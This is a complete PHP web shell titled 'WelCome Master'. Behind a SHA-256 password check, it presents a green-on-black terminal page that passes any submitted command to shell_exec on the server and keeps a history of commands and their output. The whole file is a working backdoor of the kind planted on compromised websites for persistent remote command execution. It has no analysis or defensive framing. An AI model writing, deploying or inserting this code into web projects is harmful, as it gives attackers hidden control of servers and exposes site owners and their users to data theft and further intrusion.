<?php
session_start();


if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['pass'])) {
        if (hash("sha256", $_POST['pass']) === "68215fa3501ae17394bac692f12a5fe1cd6675a7c048d7307800956469f81057") {
            $_SESSION['loggedin'] = true;
        } else {
            die("<pre>Invalid Code.</pre>");
        }
    } else {
        echo '<form method="post" style="background:black;color:lime;padding:20px">
                <label>Password: </label>
                <input type="password" name="pass" autofocus>
                <input type="submit" value="Login">
              </form>';
        exit;
    }
}

$output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");
    $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output];
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>WelCome Master</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: monospace;
            padding: 20px;
        }
        .output-box {
            background-color: #111;
            border: 1px solid #444;
            padding: 15px;
            height: 400px;
            overflow-y: scroll;
            margin-bottom: 15px;
            font-size: var(--output-size, 14px);
            color: var(--output-color, white);
        }
        input[type="text"] {
            width: 80%;
            background-color: #111;
            color: lime;
            border: 1px solid #444;
            padding: 8px;
            font-size: var(--input-size, 14px);
        }
        input[type="submit"] {
            background-color: #222;
            color: lime;
            border: 1px solid #444;
            padding: 8px 16px;
        }
        select {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <h2>Interactive PHP Shell</h2>

    <!-- Controls -->
    <form method="post" style="margin-bottom: 10px;">
        <label>Font size:</label>
        <select onchange="setFontSize(this.value)">
            <option value="12px">12</option>
            <option value="14px" selected>14</option>
            <option value="16px">16</option>
            <option value="18px">18</option>
            <option value="20px">20</option>
        </select>
        <label>Text color:</label>
        <select onchange="setColor(this.value)">
            <option value="white" selected>White</option>
            <option value="lime">Lime</option>
            <option value="cyan">Cyan</option>
            <option value="yellow">Yellow</option>
            <option value="red">Red</option>
        </select>
    </form>

    <div class="output-box" id="terminal">
        <?php
        if (!empty($_SESSION['history'])) {
            foreach ($_SESSION['history'] as $entry) {
                echo "<span style='color:lime;'>$ " . htmlentities($entry['cmd']) . "</span><br>";
                echo "<pre>" . htmlentities($entry['output']) . "</pre>";
            }
        }
        ?>
    </div>

    <form method="post">
        <input type="text" name="cmd" autofocus autocomplete="off" placeholder="Enter command">
        <input type="submit" value="Run">
    </form>

    <script>
        // Auto-scroll terminal to bottom
        const terminal = document.getElementById("terminal");
        terminal.scrollTop = terminal.scrollHeight;

        // Apply custom font size
        function setFontSize(size) {
            document.documentElement.style.setProperty('--output-size', size);
            document.documentElement.style.setProperty('--input-size', size);
        }

        // Apply custom text color
        function setColor(color) {
            document.documentElement.style.setProperty('--output-color', color);
        }
    </script>
</body>
</html>
